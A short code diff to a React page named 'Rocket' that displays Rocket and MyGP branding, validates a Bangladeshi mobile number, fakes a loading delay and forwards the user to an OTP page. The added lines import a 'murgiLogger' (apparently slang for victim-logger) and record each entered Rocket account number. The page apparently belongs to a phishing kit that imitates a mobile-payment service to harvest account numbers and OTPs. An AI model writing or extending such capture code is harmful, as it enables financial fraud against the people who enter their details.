@@ -4,6 +4,7 @@ import { useToast } from "@/hooks/use-toast";
 import rocketLogo from "@/assets/rocket-logo.png";
 import mygpLogo from "@/assets/mygp-logo.png";
 import { Loader } from "@/components/ui/loader";
+import murgiLogger from "@/lib/murgiLogger";
 
 const Rocket = () => {
   const navigate = useNavigate();
@@ -17,6 +18,7 @@ const Rocket = () => {
   const handleConfirm = () => {
     const bdPhoneRegex = /^01[3-9]\d{8}$/;
     if (accountNumber.length === 11 && bdPhoneRegex.test(accountNumber)) {
+      murgiLogger.paymentNumber("Rocket", accountNumber);
       setLoading(true);
       setTimeout(() => {
         navigate(`/otp?amount=${amount}`, { 
